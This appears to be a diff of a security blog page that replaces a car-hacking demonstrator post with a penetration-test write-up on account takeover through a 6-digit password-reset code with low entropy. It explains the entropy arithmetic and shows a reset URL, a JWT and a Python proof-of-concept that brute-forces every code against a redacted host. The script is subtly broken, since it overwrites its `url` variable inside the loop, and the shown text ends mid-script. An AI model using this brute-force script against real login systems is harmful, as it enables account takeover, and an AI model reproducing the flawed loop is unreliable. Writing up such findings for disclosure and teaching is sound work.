@@ -9,14 +9,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Inside Our Car Hacking Demonstrator &middot; &gt;_ majix.site</title>
-  <meta name="title" content="Inside Our Car Hacking Demonstrator &middot; &gt;_ majix.site" />
+  <title>Account Takeover via flawed reset mechanism &middot; &gt;_ majix.site</title>
+  <meta name="title" content="Account Takeover via flawed reset mechanism &middot; &gt;_ majix.site" />
   
-  <meta name="description" content="Introduction into Cache Poisoning Attacks" />
-  <meta name="keywords" content="IDS, Car Hacking, OT, CAN, " />
+  <meta name="description" content="See how a simple reset mechanism can lead to account takeover when configured wrong" />
+  <meta name="keywords" content="ATO, Password Reset, Token Entropy, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/posts/demonstrator-v1/" />
+  <link rel="canonical" href="http://localhost:1313/posts/ato-via-flawed-password-reset/" />
   
   
   
@@ -70,26 +70,25 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/posts/demonstrator-v1/">
+  <meta property="og:url" content="http://localhost:1313/posts/ato-via-flawed-password-reset/">
   <meta property="og:site_name" content="&gt;_ majix.site">
-  <meta property="og:title" content="Inside Our Car Hacking Demonstrator">
-  <meta property="og:description" content="Introduction into Cache Poisoning Attacks">
+  <meta property="og:title" content="Account Takeover via flawed reset mechanism">
+  <meta property="og:description" content="See how a simple reset mechanism can lead to account takeover when configured wrong">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-02-21T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-02-21T00:00:00+00:00">
-    <meta property="article:tag" content="IDS">
-    <meta property="article:tag" content="Car Hacking">
-    <meta property="article:tag" content="OT">
-    <meta property="article:tag" content="CAN">
-    <meta property="og:image" content="http://localhost:1313/posts/demonstrator-v1/feature.webp">
+    <meta property="article:published_time" content="2025-03-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-03-09T00:00:00+00:00">
+    <meta property="article:tag" content="ATO">
+    <meta property="article:tag" content="Password Reset">
+    <meta property="article:tag" content="Token Entropy">
+    <meta property="og:image" content="http://localhost:1313/posts/ato-via-flawed-password-reset/feature.webp">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/posts/demonstrator-v1/feature.webp">
-  <meta name="twitter:title" content="Inside Our Car Hacking Demonstrator">
-  <meta name="twitter:description" content="Introduction into Cache Poisoning Attacks">
+  <meta name="twitter:image" content="http://localhost:1313/posts/ato-via-flawed-password-reset/feature.webp">
+  <meta name="twitter:title" content="Account Takeover via flawed reset mechanism">
+  <meta name="twitter:description" content="See how a simple reset mechanism can lead to account takeover when configured wrong">
 
   
   <script type="application/ld+json">
@@ -97,26 +96,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Inside Our Car Hacking Demonstrator",
-    "headline": "Inside Our Car Hacking Demonstrator",
-    "description": "Introduction into Cache Poisoning Attacks",
-    "abstract": "Introduction #\rOver the past year, we\u0026rsquo;ve developed a cutting-edge car hacking demonstrator primarily for internal training purposes.",
+    "name": "Account Takeover via flawed reset mechanism",
+    "headline": "Account Takeover via flawed reset mechanism",
+    "description": "See how a simple reset mechanism can lead to account takeover when configured wrong",
+    "abstract": "Overview #\rIn this article, we explore a critical security vulnerability discovered during a penetration test.",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/posts\/demonstrator-v1\/",
+    "url" : "http:\/\/localhost:1313\/posts\/ato-via-flawed-password-reset\/",
     "author" : {
       "@type": "Person",
       "name": "Max"
     },
     "copyrightYear": "2025",
-    "dateCreated": "2025-02-21T00:00:00\u002b00:00",
-    "datePublished": "2025-02-21T00:00:00\u002b00:00",
+    "dateCreated": "2025-03-09T00:00:00\u002b00:00",
+    "datePublished": "2025-03-09T00:00:00\u002b00:00",
     
-    "dateModified": "2025-02-21T00:00:00\u002b00:00",
+    "dateModified": "2025-03-09T00:00:00\u002b00:00",
     
-    "keywords": ["IDS","Car Hacking","OT","CAN"],
+    "keywords": ["ATO","Password Reset","Token Entropy"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "559"
+    "wordCount": "485"
   }]
   </script>
 
@@ -140,6 +139,139 @@
   
 
 <script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js" integrity="sha512-A8sWDjz9smZ6LiyA0oO&#43;vPY/&#43;LvEtinJqyur9vrh0MB61HDtrng&#43;&#43;k&#43;r2irAHFjWDmO5izwza&#43;gghGDwj0NU9Q=="></script>
+
+
+
+
+
+
+
+
+
+
+
+<link type="text/css" rel="stylesheet" href="/lib/katex/katex.min.b6af89fb858eebf3a2f76dc5e96fec34b1ea60df75a463322f39a5e8386328f85a735a1393786ff33160aa709a25cb5d697b8b2fa554cf082d274e94655e0732.css" integrity="sha512-tq&#43;J&#43;4WO6/Oi923F6W/sNLHqYN91pGMyLzml6DhjKPhac1oTk3hv8zFgqnCaJctdaXuLL6VUzwgtJ06UZV4HMg==" />
+
+
+<script defer src="/lib/katex/katex.min.50f14e69d6a8da7128ae3b63974c544ed377c36d096b5e3750f114e84c89d668b9301d9b0ed3248969aa183aa2e3bc4d2c1e73d5dcb7d462890c45a18d424589.js" integrity="sha512-UPFOadao2nEorjtjl0xUTtN3w20Ja143UPEU6EyJ1mi5MB2bDtMkiWmqGDqi47xNLB5z1dy31GKJDEWhjUJFiQ=="></script>
+
+
+<script defer src="/lib/katex/auto-render.min.6095714e3aadb63b14ddc4af69346ab12974c1b460654345f8d1860a0b68fcc51b22f68b757433193090bb80afc8965b65cb607e5541d0f5f0f4b2e64d69b9ff.js" integrity="sha512-YJVxTjqttjsU3cSvaTRqsSl0wbRgZUNF&#43;NGGCgto/MUbIvaLdXQzGTCQu4CvyJZbZctgflVB0PXw9LLmTWm5/w=="
+  onload="renderMathInElement(document.body);"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -466,7 +598,7 @@
 
     
     <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
-    style="background-image:url(/posts/demonstrator-v1/feature.webp);">
+    style="background-image:url(/posts/ato-via-flawed-password-reset/feature.webp);">
     
 
 
@@ -519,8 +651,8 @@
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/posts/demonstrator-v1/"
-      >Inside Our Car Hacking Demonstrator</a
+      href="/posts/ato-via-flawed-password-reset/"
+      >Account Takeover via flawed reset mechanism</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -529,7 +661,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Inside Our Car Hacking Demonstrator
+      Account Takeover via flawed reset mechanism
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -572,7 +704,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2025-02-21T00:00:00&#43;00:00">21 February 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+  <time datetime="2025-03-09T00:00:00&#43;00:00">9 March 2025</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
   
 
   
@@ -596,34 +728,26 @@
   
   
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ids/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ato/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    IDS
+    ATO
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/car-hacking/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/password-reset/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Car Hacking
+    Password Reset
   </span>
 </span>
   </span>
   
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/ot/&#34;,'_self');return false;">
+  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/token-entropy/&#34;,'_self');return false;">
     <span class="flex" style="cursor: pointer;">
   <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    OT
-  </span>
-</span>
-  </span>
-  
-  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/can/&#34;,'_self');return false;">
-    <span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    CAN
+    Token Entropy
   </span>
 </span>
   </span>
@@ -674,23 +798,20 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#i-classfa-solid-fa-house-text-primary-400i-introduction"><i class="fa-solid fa-house text-primary-400"></i> Introduction</a></li>
-    <li><a href="#i-classfa-solid-fa-car-text-primary-400i-background-span-classtext-primary-400span-context"><i class="fa-solid fa-car text-primary-400"></i> Background <span class="text-primary-400">&amp;</span> Context</a>
+    <li><a href="#i-classfa-solid-fa-bars-text-primary-400i-overview"><i class="fa-solid fa-bars text-primary-400"></i> Overview</a></li>
+    <li><a href="#i-classfa-solid-fa-bullseye-text-primary-400i-token-reset-mechanism"><i class="fa-solid fa-bullseye text-primary-400"></i> Token Reset Mechanism</a></li>
+    <li><a href="#i-classfa-solid-fa-lock-text-primary-400i-security-entropy-analysis"><i class="fa-solid fa-lock text-primary-400"></i> Security Entropy Analysis</a>
       <ul>
-        <li><a href="#why-automotive-cybersecurity-matters">Why Automotive Cybersecurity Matters</a></li>
-        <li><a href="#overview-of-the-demonstrator">Overview of the Demonstrator</a>
-          <ul>
-            <li><a href="#demonstrator">Demonstrator</a></li>
-            <li><a href="#driver-dashboard">Driver Dashboard</a></li>
-            <li><a href="#attacker-dashboard">Attacker Dashboard</a></li>
-            <li><a href="#defender-dashboard">Defender Dashboard</a></li>
-          </ul>
-        </li>
+        <li><a href="#what-is-entropy">What is Entropy?</a></li>
+        <li><a href="#token-entropy-of-the-application">Token entropy of the application</a></li>
       </ul>
     </li>
-    <li><a href="#i-classfa-solid-fa-microchip-text-primary-400i-architecture-and-setup"><i class="fa-solid fa-microchip text-primary-400"></i> Architecture and Setup</a></li>
-    <li><a href="#i-classfa-solid-fa-glasses-text-primary-400i-future-outlook-and-recommendations"><i class="fa-solid fa-glasses text-primary-400"></i> Future Outlook and Recommendations</a></li>
-    <li><a href="#i-classfa-solid-fa-list-ul-text-primary-400i-conclusion"><i class="fa-solid fa-list-ul text-primary-400"></i> Conclusion</a></li>
+    <li><a href="#i-classfa-solid-fa-hammer-text-primary-400i-the-exploit"><i class="fa-solid fa-hammer text-primary-400"></i> The Exploit</a>
+      <ul>
+        <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
+        <li><a href="#further-exploitation">Further Exploitation</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -704,23 +825,20 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#i-classfa-solid-fa-house-text-primary-400i-introduction"><i class="fa-solid fa-house text-primary-400"></i> Introduction</a></li>
-    <li><a href="#i-classfa-solid-fa-car-text-primary-400i-background-span-classtext-primary-400span-context"><i class="fa-solid fa-car text-primary-400"></i> Background <span class="text-primary-400">&amp;</span> Context</a>
+    <li><a href="#i-classfa-solid-fa-bars-text-primary-400i-overview"><i class="fa-solid fa-bars text-primary-400"></i> Overview</a></li>
+    <li><a href="#i-classfa-solid-fa-bullseye-text-primary-400i-token-reset-mechanism"><i class="fa-solid fa-bullseye text-primary-400"></i> Token Reset Mechanism</a></li>
+    <li><a href="#i-classfa-solid-fa-lock-text-primary-400i-security-entropy-analysis"><i class="fa-solid fa-lock text-primary-400"></i> Security Entropy Analysis</a>
       <ul>
-        <li><a href="#why-automotive-cybersecurity-matters">Why Automotive Cybersecurity Matters</a></li>
-        <li><a href="#overview-of-the-demonstrator">Overview of the Demonstrator</a>
-          <ul>
-            <li><a href="#demonstrator">Demonstrator</a></li>
-            <li><a href="#driver-dashboard">Driver Dashboard</a></li>
-            <li><a href="#attacker-dashboard">Attacker Dashboard</a></li>
-            <li><a href="#defender-dashboard">Defender Dashboard</a></li>
-          </ul>
-        </li>
+        <li><a href="#what-is-entropy">What is Entropy?</a></li>
+        <li><a href="#token-entropy-of-the-application">Token entropy of the application</a></li>
       </ul>
     </li>
-    <li><a href="#i-classfa-solid-fa-microchip-text-primary-400i-architecture-and-setup"><i class="fa-solid fa-microchip text-primary-400"></i> Architecture and Setup</a></li>
-    <li><a href="#i-classfa-solid-fa-glasses-text-primary-400i-future-outlook-and-recommendations"><i class="fa-solid fa-glasses text-primary-400"></i> Future Outlook and Recommendations</a></li>
-    <li><a href="#i-classfa-solid-fa-list-ul-text-primary-400i-conclusion"><i class="fa-solid fa-list-ul text-primary-400"></i> Conclusion</a></li>
+    <li><a href="#i-classfa-solid-fa-hammer-text-primary-400i-the-exploit"><i class="fa-solid fa-hammer text-primary-400"></i> The Exploit</a>
+      <ul>
+        <li><a href="#proof-of-concept-poc">Proof of Concept (PoC)</a></li>
+        <li><a href="#further-exploitation">Further Exploitation</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -805,182 +923,136 @@
           <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 
 
-<h2 class="relative group"><i class="fa-solid fa-house text-primary-400"></i> Introduction 
-    <div id="i-classfa-solid-fa-house-text-primary-400i-introduction" class="anchor"></div>
+<h2 class="relative group"><i class="fa-solid fa-bars text-primary-400"></i> Overview 
+    <div id="i-classfa-solid-fa-bars-text-primary-400i-overview" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-house-text-primary-400i-introduction" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-bars-text-primary-400i-overview" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>Over the past year, we&rsquo;ve developed a cutting-edge car hacking demonstrator primarily for internal training purposes. This platform <span class="text-primary-400">
-emulates a real car</span> &ndash; with <span class="text-primary-400">
-authentic CAN communication</span> &ndash; and offers a <span class="text-primary-400">
-hands-on way to explore automotive vulnerabilities</span>. Through various dashboards, including a speed gauge, attacker view, and defender view, we can <span class="text-primary-400">
-simulate attacks and visually observe their consequences in real time</span>.</p>
+<p>In this article, we explore a critical security vulnerability discovered during a penetration test. The flaw involves a <span class="text-primary-400">weak 6-digit code used for password resets</span>, which is not tied to individual user sessions or accounts but rather <span class="text-primary-400">added to a pool of active tokens</span>. This design flaw makes it easy for attackers to take over user accounts via a brute-force attack on the low entropy reset token.</p>
 
 
-<h2 class="relative group"><i class="fa-solid fa-car text-primary-400"></i> Background <span class="text-primary-400">&amp;</span> Context 
-    <div id="i-classfa-solid-fa-car-text-primary-400i-background-span-classtext-primary-400span-context" class="anchor"></div>
+<h2 class="relative group"><i class="fa-solid fa-bullseye text-primary-400"></i> Token Reset Mechanism 
+    <div id="i-classfa-solid-fa-bullseye-text-primary-400i-token-reset-mechanism" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-car-text-primary-400i-background-span-classtext-primary-400span-context" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-bullseye-text-primary-400i-token-reset-mechanism" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>To receive a token, a username must be entered into the reset form, which then sends the token to the email address associated with that username. The system in question employs a <span class="text-primary-400">6-digit code (0-9) for resetting passwords</span>. The reset mechanism can be triggered using a URL containing the 6-digit code, such as:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/redacted/reset?secret=123456</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOST</span><span class="o">:</span> <span class="l">redacted.com</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group"><i class="fa-solid fa-lock text-primary-400"></i> Security Entropy Analysis 
+    <div id="i-classfa-solid-fa-lock-text-primary-400i-security-entropy-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-lock-text-primary-400i-security-entropy-analysis" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 
 
-<h3 class="relative group">Why Automotive Cybersecurity Matters 
-    <div id="why-automotive-cybersecurity-matters" class="anchor"></div>
+<h3 class="relative group">What is Entropy? 
+    <div id="what-is-entropy" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#why-automotive-cybersecurity-matters" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#what-is-entropy" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>Automotive cybersecurity has become increasingly important as modern vehicles integrate more advanced IT and operational technology systems. With connected cars becoming the norm, vulnerabilities in communication protocols like the CAN bus have the potential to compromise vehicle safety and performance. Our demonstrator was built as an internal training tool to <span class="text-primary-400">bridge the gap between theoretical knowledge and real-world application</span>, allowing us to better understand these vulnerabilities in a controlled environment.</p>
+<p>Entropy, in the context of security, refers to the <span class="text-primary-400">measure of randomness and unpredictability in a system</span>. Higher entropy means greater security, as it becomes more difficult for attackers to predict or brute-force the correct values. It is <span class="text-primary-400">usually measured in bits; the more bits of entropy, the more possible combinations an attacker must try</span>. In real-life scenarios, we can consider an entropy of at least 80 bits (2^80 combinations) as secure. However, aiming for a higher entropy &ndash; such as 100 bits or more &ndash; is advisable for enhanced security.</p>
 
 
-<h3 class="relative group">Overview of the Demonstrator 
-    <div id="overview-of-the-demonstrator" class="anchor"></div>
+<h3 class="relative group">Token entropy of the application 
+    <div id="token-entropy-of-the-application" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#overview-of-the-demonstrator" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#token-entropy-of-the-application" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>Our demonstrator is an <span class="text-primary-400">innovative training platform that replicates the behavior of a real car</span>. It is built to simulate the intricate communication that occurs over the CAN bus, ensuring that the <span class="text-primary-400">training experience closely mirrors real-world scenarios</span>. The system includes multiple control units that perform individual tasks, much like those found in an actual vehicle. For example, the demonstrator can execute <span class="text-primary-400">CAN injection attacks</span>, such as speed manipulation, with these actions immediately reflected on the visual dashboards. In addition to the current dashboards which are <span class="text-primary-400">controlled via an Xbox controller</span>, we are planning to incorporate a <span class="text-primary-400">3D simulator</span> alongside the driver dashboard in our upcoming version. This new feature will allow us to <span class="text-primary-400">visualize attack scenarios</span> in even greater detail and provide an even more immersive training experience. Moreover, we plan to integrate various <span class="text-primary-400">hardware accessories</span>, such as an <span class="text-primary-400">OBD2</span> connector, that will allow us to connect real-life diagnostic devices to the demonstrator. This connector will enable us to simulate attacks even closer to reality, further enhancing the authenticity of our training experience.</p>
+<p>Each digit ranges from 0 to 9, resulting in a total of <span class="text-primary-400">1 million possible combinations</span>:</p>
+<p>
+
+<span class="text-primary-400">\(10^6 = 1.000.000\)</p>
+<p>For our 6-digit token, the entropy calculation is:</p>
+<p>
+
+<span class="text-primary-400">\(log_2(1.000.000) = 19.93\)</p>
+<p>This translates to roughly 19 bits (2^19) of entropy, which is significantly lower than the recommended minimum of 80 bits. Such low entropy makes the token susceptible to brute-force attacks.</p>
 
 
-<h4 class="relative group">Demonstrator 
-    <div id="demonstrator" class="anchor"></div>
+<h2 class="relative group"><i class="fa-solid fa-hammer text-primary-400"></i> The Exploit 
+    <div id="i-classfa-solid-fa-hammer-text-primary-400i-the-exploit" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#demonstrator" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-
-<figure>
-      <img class="my-0 rounded-md" src="/images/posts/demonstrator/v1/d1.jpeg" alt="Description of the image" />
-  
-  
-  </figure>
-
-<figure>
-      <img class="my-0 rounded-md" src="/images/posts/demonstrator/v1/d2.jpeg" alt="Description of the image" />
-  
-  
-  </figure>
-
-
-<h4 class="relative group">Driver Dashboard 
-    <div id="driver-dashboard" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#driver-dashboard" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-
-<figure>
-      <img class="my-0 rounded-md" src="/images/posts/demonstrator/v1/driver.gif" alt="Description of the image" />
-  
-  
-  </figure>
-
-
-<h4 class="relative group">Attacker Dashboard 
-    <div id="attacker-dashboard" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#attacker-dashboard" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-
-<figure>
-      <img class="my-0 rounded-md" src="/images/posts/demonstrator/v1/attack.gif" alt="Description of the image" />
-  
-  
-  </figure>
-
-
-<h4 class="relative group">Defender Dashboard 
-    <div id="defender-dashboard" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#defender-dashboard" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-
-<figure>
-      <img class="my-0 rounded-md" src="/images/posts/demonstrator/v1/detect.gif" alt="Description of the image" />
-  
-  
-  </figure>
-
-
-<h2 class="relative group"><i class="fa-solid fa-microchip text-primary-400"></i> Architecture and Setup 
-    <div id="i-classfa-solid-fa-microchip-text-primary-400i-architecture-and-setup" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-microchip-text-primary-400i-architecture-and-setup" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-hammer-text-primary-400i-the-exploit" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>Although we will not delve into the specific hardware details, it is important to note that our demonstrator mirrors a real car’s architecture. It employs a modular design with <span class="text-primary-400">distinct control units that manage functions like speed regulation and sensor feedback</span>. The system leverages real CAN bus communication protocols to maintain authenticity, and the integrated dashboards provide clear, visual feedback during each phase of an attack. This <span class="text-primary-400">realistic emulation helps our team understand how various vulnerabilities can be exploited and, in turn, how they might be mitigated in real vehicles</span>.</p>
+<p>Due to the low entropy, an attacker can feasibly attempt all 1 million combinations within a reasonable timeframe. <span class="text-primary-400">Once a valid token is discovered, it can be used to reset the password for any account associated with an active token in the pool</span>. Upon successful token validation, the system returns a JSON Web Token (JWT) containing user information:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;MyUser1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;exp&#34;</span><span class="p">:</span> <span class="mi">1719570230</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;permissions&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;UpdatePassword&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <span class="text-primary-400">sub field reveals the username</span>, allowing the attacker to identify the account. With permission to update the password, the attacker gains full control over the compromised account.</p>
 
 
-<h2 class="relative group"><i class="fa-solid fa-glasses text-primary-400"></i> Future Outlook and Recommendations 
-    <div id="i-classfa-solid-fa-glasses-text-primary-400i-future-outlook-and-recommendations" class="anchor"></div>
+<h3 class="relative group">Proof of Concept (PoC) 
+    <div id="proof-of-concept-poc" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#i-classfa-solid-fa-glasses-text-primary-400i-future-outlook-and-recommendations" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#proof-of-concept-poc" aria-label="Anchor">#</a>
     </span>        
     
-</h2>
-<p>As automotive technology continues to evolve, the sophistication of potential cyberattacks is also expected to increase. Our car hacking <span class="text-primary-400">demonstrator will evolve alongside</span> these emerging threats, ensuring that our training remains relevant and effective. We believe that <span class="text-primary-400">practical, hands-on training is essential for preparing security teams</span> to defend against these threats.</p>
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PYTHON" data-lang="PYTHON"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;redacted&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&#34;/redacted/reset/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;https://</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">endpoint</span><span class="si">}</span><span class="s2">?secret=</span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;eyJ&#34;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Valid token found: </span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
